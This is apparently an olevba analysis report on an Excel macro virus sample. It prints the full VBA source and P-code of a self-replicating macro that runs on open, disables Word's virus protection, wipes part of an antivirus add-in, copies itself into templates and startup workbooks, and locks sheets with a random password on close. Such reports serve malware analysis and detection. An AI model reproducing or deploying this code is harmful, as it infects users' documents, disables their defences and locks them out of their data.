olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSExcel.Vcx.j
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: ./Virus.MSExcel.Vcx.j - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист1.cls 
in file: ./Virus.MSExcel.Vcx.j - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист2.cls 
in file: ./Virus.MSExcel.Vcx.j - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист3.cls 
in file: ./Virus.MSExcel.Vcx.j - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NEWMAC.bas 
in file: ./Virus.MSExcel.Vcx.j - OLE stream: '_VBA_PROJECT_CUR/VBA/NEWMAC'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim k As Long
Dim s As Long
Dim u As Long
Dim a As Long
Dim b As String
 

Sub Auto_Open()
    Application.OnSheetActivate = "NEWMAC.AutoCCC"
End Sub

Sub AutoCCC()
Attribute AutoCCC.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error Resume Next
    b = String(7, 0)
    s = 256
    v$ = String$(s, 0)
    Application.ScreenUpdating = False
    Application.EnableCancelKey = wdCancelDisabled
    Application.DisplayAlerts = wdAlertsNone
    Application.VBE.ActiveVBProject.VBComponents("NEWMAC").Export "c:\Windows\System\NEWMAC.386"
    Workbooks("MV_Vaccine.xla").Sheets("ѕЖАМДЬ").Columns("E:H").ClearContents
    Workbooks("MV_Vaccine.xla").Save
    
god:
    On Error GoTo god_1
    If ActiveDocument = "" Then GoTo god_3
        
    With Options
        .VirusProtection = False
        .ConfirmConversions = False
        .SaveNormalPrompt = False
    End With
    
    ActiveDocument.ReadOnlyRecommended = False
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(i).Name = "NEWMAC" Then r = True
    Next i
    
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "NEWMAC" Then e = True
    Next i
    
    If e = False Then
        With ActiveDocument.VBProject
            With .VBComponents.Import("c:\Windows\System\NEWMAC.386")
            End With
        End With
        
        ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
    End If
    If r = False Then
        With NormalTemplate.VBProject
            With .VBComponents.Import("c:\Windows\System\NEWMAC.386")
            End With
        End With
    End If
        
    GoTo god_1
    
god_3:
    If Dir(Application.StartupPath + "\NEWMAC.xls") = "NEWMAC.xls" Then p = True
    
    For i = 1 To ActiveWorkbook.VBProject.VBComponents.Count
        If ActiveWorkbook.VBProject.VBComponents(i).Name = "NEWMAC" Then t = True
    Next i
    
    If t = False Then
        With ActiveWorkbook.VBProject
            With .VBComponents.Import("c:\Windows\System\NEWMAC.386")
            End With
        End With
    End If
    
    If p = False Then
        Workbooks.Add.SaveAs FileName:=Application.StartupPath + "\NEWMAC.xls"
        With ActiveWorkbook.VBProject
            With .VBComponents.Import("c:\Windows\System\NEWMAC.386")
            End With
        End With
    
        ActiveWindow.Visible = False
        Workbooks("NEWMAC.xls").Save
    End If
    
    If b = ".False." Then GoTo god_1
    
god_1:
toend:
End Sub

Sub AutoExit()
    Call AutoCCC
End Sub

Sub Auto_Close()
    On Error Resume Next
    Randomize
    NNNN = Rnd(300)
    ActiveWorkbook.Sheets(1).Protect NNNN
End Sub

Sub AutoClose()
    On Error Resume Next
    Randomize
    NNNN = Rnd(300)
    ActiveWorkbook.Sheets(1).Protect NNNN
End Sub

Sub ToolsMacro()
End Sub

Sub FileTemplates()
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSExcel.Vcx.j
' ===============================================================================
' Module streams:
' _VBA_PROJECT_CUR/VBA/ThisWorkbook - 965 bytes
' _VBA_PROJECT_CUR/VBA/Лист1 - 956 bytes
' _VBA_PROJECT_CUR/VBA/Лист2 - 956 bytes
' _VBA_PROJECT_CUR/VBA/Лист3 - 956 bytes
' _VBA_PROJECT_CUR/VBA/NEWMAC - 5439 bytes
' Line #0:
' 	Dim 
' 	VarDefn k (As Long)
' Line #1:
' 	Dim 
' 	VarDefn s (As Long)
' Line #2:
' 	Dim 
' 	VarDefn u (As Long)
' Line #3:
' 	Dim 
' 	VarDefn a (As Long)
' Line #4:
' 	Dim 
' 	VarDefn B (As String)
' Line #5:
' Line #6:
' Line #7:
' 	FuncDefn (Sub Auto_Open())
' Line #8:
' 	LitStr 0x000E "NEWMAC.AutoCCC"
' 	Ld Application 
' 	MemSt OnSheetActivate 
' Line #9:
' 	EndSub 
' Line #10:
' Line #11:
' 	FuncDefn (Sub AutoCCC())
' Line #12:
' 	OnError (Resume Next) 
' Line #13:
' 	LitDI2 0x0007 
' 	LitDI2 0x0000 
' 	ArgsLd String$ 0x0002 
' 	St B 
' Line #14:
' 	LitDI2 0x0100 
' 	St s 
' Line #15:
' 	Ld s 
' 	LitDI2 0x0000 
' 	ArgsLd String$$ 0x0002 
' 	St v$ 
' Line #16:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #17:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #18:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #19:
' 	LitStr 0x001C "c:\Windows\System\NEWMAC.386"
' 	LitStr 0x0006 "NEWMAC"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #20:
' 	LitStr 0x0003 "E:H"
' 	LitStr 0x0006 "ѕЖАМДЬ"
' 	LitStr 0x000E "MV_Vaccine.xla"
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Sheets 0x0001 
' 	ArgsMemLd Columns 0x0001 
' 	ArgsMemCall ClearContents 0x0000 
' Line #21:
' 	LitStr 0x000E "MV_Vaccine.xla"
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #22:
' Line #23:
' 	Label god 
' Line #24:
' 	OnError god_1 
' Line #25:
' 	Ld ActiveDocument 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo god_3 
' 	EndIf 
' Line #26:
' Line #27:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #28:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #29:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #30:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #31:
' 	EndWith 
' Line #32:
' Line #33:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #34:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #35:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "NEWMAC"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St r 
' 	EndIf 
' Line #36:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #37:
' Line #38:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #39:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "NEWMAC"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St e 
' 	EndIf 
' Line #40:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #41:
' Line #42:
' 	Ld e 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #43:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	With 
' Line #44:
' 	StartWithExpr 
' 	LitStr 0x001C "c:\Windows\System\NEWMAC.386"
' 	MemLdWith VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #45:
' 	EndWith 
' Line #46:
' 	EndWith 
' Line #47:
' Line #48:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	Ld r 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #51:
' 	StartWithExpr 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	With 
' Line #52:
' 	StartWithExpr 
' 	LitStr 0x001C "c:\Windows\System\NEWMAC.386"
' 	MemLdWith VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #53:
' 	EndWith 
' Line #54:
' 	EndWith 
' Line #55:
' 	EndIfBlock 
' Line #56:
' Line #57:
' 	GoTo god_1 
' Line #58:
' Line #59:
' 	Label god_3 
' Line #60:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000B "\NEWMAC.xls"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x000A "NEWMAC.xls"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St p 
' 	EndIf 
' Line #61:
' Line #62:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #63:
' 	Ld i 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "NEWMAC"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St t 
' 	EndIf 
' Line #64:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #65:
' Line #66:
' 	Ld t 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #67:
' 	StartWithExpr 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	With 
' Line #68:
' 	StartWithExpr 
' 	LitStr 0x001C "c:\Windows\System\NEWMAC.386"
' 	MemLdWith VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #69:
' 	EndWith 
' Line #70:
' 	EndWith 
' Line #71:
' 	EndIfBlock 
' Line #72:
' Line #73:
' 	Ld p 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #74:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000B "\NEWMAC.xls"
' 	Add 
' 	ParamNamed FileName 
' 	Ld Workbooks 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0001 
' Line #75:
' 	StartWithExpr 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	With 
' Line #76:
' 	StartWithExpr 
' 	LitStr 0x001C "c:\Windows\System\NEWMAC.386"
' 	MemLdWith VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #77:
' 	EndWith 
' Line #78:
' 	EndWith 
' Line #79:
' Line #80:
' 	LitVarSpecial (False)
' 	Ld ActiveWindow 
' 	MemSt Visible 
' Line #81:
' 	LitStr 0x000A "NEWMAC.xls"
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #82:
' 	EndIfBlock 
' Line #83:
' Line #84:
' 	Ld B 
' 	LitStr 0x0007 ".False."
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo god_1 
' 	EndIf 
' Line #85:
' Line #86:
' 	Label god_1 
' Line #87:
' 	Label toend 
' Line #88:
' 	EndSub 
' Line #89:
' Line #90:
' 	FuncDefn (Sub AutoExit())
' Line #91:
' 	ArgsCall (Call) AutoCCC 0x0000 
' Line #92:
' 	EndSub 
' Line #93:
' Line #94:
' 	FuncDefn (Sub Auto_Close())
' Line #95:
' 	OnError (Resume Next) 
' Line #96:
' 	ArgsCall Read 0x0000 
' Line #97:
' 	LitDI2 0x012C 
' 	ArgsLd Rnd 0x0001 
' 	St NNNN 
' Line #98:
' 	Ld NNNN 
' 	LitDI2 0x0001 
' 	Ld ActiveWorkbook 
' 	ArgsMemLd Sheets 0x0001 
' 	ArgsMemCall Protect 0x0001 
' Line #99:
' 	EndSub 
' Line #100:
' Line #101:
' 	FuncDefn (Sub AutoClose())
' Line #102:
' 	OnError (Resume Next) 
' Line #103:
' 	ArgsCall Read 0x0000 
' Line #104:
' 	LitDI2 0x012C 
' 	ArgsLd Rnd 0x0001 
' 	St NNNN 
' Line #105:
' 	Ld NNNN 
' 	LitDI2 0x0001 
' 	Ld ActiveWorkbook 
' 	ArgsMemLd Sheets 0x0001 
' 	ArgsMemCall Protect 0x0001 
' Line #106:
' 	EndSub 
' Line #107:
' Line #108:
' 	FuncDefn (Sub ToolsMacro())
' Line #109:
' 	EndSub 
' Line #110:
' Line #111:
' 	FuncDefn (Sub FileTemplates())
' Line #112:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

